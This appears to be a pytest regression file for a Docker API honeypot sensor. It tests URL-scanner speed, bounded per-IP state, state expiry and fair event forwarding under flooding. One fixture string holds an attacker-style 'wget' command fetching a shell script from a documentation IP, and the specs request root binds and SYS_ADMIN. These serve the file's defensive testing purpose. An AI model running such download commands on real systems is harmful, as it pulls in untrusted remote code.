"""Regression tests from the security review: scanner cost, bounded state, event fairness."""

from __future__ import annotations

import asyncio
import json
import time

import pytest
from suckerpot_common import Event, EventType

from docker_sensor.analysis import find_urls, parse_container_spec
from docker_sensor.api import DockerApi
from docker_sensor.config import Config
from docker_sensor.events import EventSink
from docker_sensor.profile import build_profile


@pytest.mark.parametrize("unit", ["http:// ", "http://. ", "https://;http://,ftp://"])
@pytest.mark.parametrize("size", [64 * 1024, 256 * 1024])
def test_find_urls_is_linear_on_empty_urls(unit: str, size: int) -> None:
    text = unit * (size // len(unit))
    t0 = time.perf_counter()
    find_urls(text)
    assert time.perf_counter() - t0 < 0.05


def test_find_urls_still_finds_urls_after_empty_ones() -> None:
    text = "http:// " * 10 + "wget http://203.0.113.5/a.sh"
    assert find_urls(text) == ["http://203.0.113.5/a.sh"]


async def test_garbage_create_body_does_not_stall_the_loop(harness) -> None:  # type: ignore[no-untyped-def]
    body = b"http:// " * 32768
    t0 = time.perf_counter()
    status, _, _ = await harness.http("POST", "/v1.47/containers/create", body)
    assert status == 400
    assert time.perf_counter() - t0 < 0.5


def test_state_stays_under_budget_for_many_ips_with_maximal_specs(tmp_path) -> None:  # type: ignore[no-untyped-def]
    cfg = Config(data_dir=str(tmp_path))
    api = DockerApi(cfg, build_profile(b"x" * 32, 1_790_000_000.0))
    big = "x" * 4000
    spec = {
        "Image": "i" * 300,
        "Cmd": [big] * 8,
        "Entrypoint": [big] * 8,
        "Env": ["A=" + "y" * 3000] * 20,
        "User": "u" * 5000,
        "HostConfig": {
            "Binds": ["/:/m" + big] * 12,
            "PidMode": "p" * 5000,
            "NetworkMode": "n" * 5000,
            "CapAdd": ["SYS_ADMIN" * 50] * 20,
        },
    }
    raw = json.dumps(spec).encode()
    assert len(raw) < cfg.body_cap
    parsed = parse_container_spec(spec)
    assert len(parsed.user) <= 64 and len(parsed.pid_mode) <= 32
    from docker_sensor.httpio import Request

    for n in range(2048):
        ip = f"198.51.{n // 256}.{n % 256}"
        for k in range(10):
            req = Request(
                method="POST",
                target="/containers/create",
                path="/containers/create",
                query_raw=f"name=c{k}",
                version="HTTP/1.1",
                headers=[],
            )
            req.body = raw
            api.handle(req, ip)
    assert api.state_bytes <= cfg.state_bytes
    assert len(api._state) <= cfg.state_ips
    assert all(len(s.containers) <= cfg.state_per_ip for s in api._state.values())


def test_state_expires_after_ttl(tmp_path) -> None:  # type: ignore[no-untyped-def]
    cfg = Config(data_dir=str(tmp_path), state_ttl=0.0)
    api = DockerApi(cfg, build_profile(b"x" * 32, 1_790_000_000.0))
    api.state("192.0.2.1")
    time.sleep(0.01)
    api.state("192.0.2.2")
    assert "192.0.2.1" not in api._state


class _Pub:
    def __init__(self) -> None:
        self.events: list[Event] = []

    async def publish(self, event: Event) -> bool:
        await asyncio.sleep(0.001)
        self.events.append(event)
        return True

    async def close(self) -> None:
        return None


async def test_victim_keeps_every_event_next_to_many_flooding_ips() -> None:
    pub = _Pub()
    sink = EventSink(pub)
    sink.start()

    def emit(ip: str, sid: str, t: EventType, important: bool = False) -> None:
        sink.emit(
            session_id=sid,
            src_ip=ip,
            src_port=1,
            dst_port=2375,
            type_=t,
            data={"n": 1},
            important=important,
        )

    flooders = [f"203.0.113.{n}" for n in range(1, 15)]
    for rnd in range(40):
        for ip in flooders:
            for c in range(8):
                sid = f"f{c}"
                for _ in range(10):
                    emit(ip, sid, EventType.http_request)
                    emit(ip, sid, EventType.login_attempt, important=True)
        await asyncio.sleep(0.01)
    sent = {"login_attempt": 0, "http_request": 0}
    for i in range(30):
        emit("198.51.100.5", "v1", EventType.login_attempt, important=True)
        emit("198.51.100.5", "v1", EventType.http_request)
        sent["login_attempt"] += 1
        sent["http_request"] += 1
        for _ in range(60):  # the flood goes on while the victim works
            emit(flooders[i % 14], "x", EventType.login_attempt, important=True)
    emit("198.51.100.5", "v1", EventType.disconnect)
    await sink.flush(30)
    got = [e for e in pub.events if str(e.src_ip) == "198.51.100.5"]
    for kind, n in sent.items():
        assert sum(1 for e in got if e.type == kind) == n, (kind, sink.stats())
    assert any(e.type == EventType.disconnect for e in got)
    await sink.close()
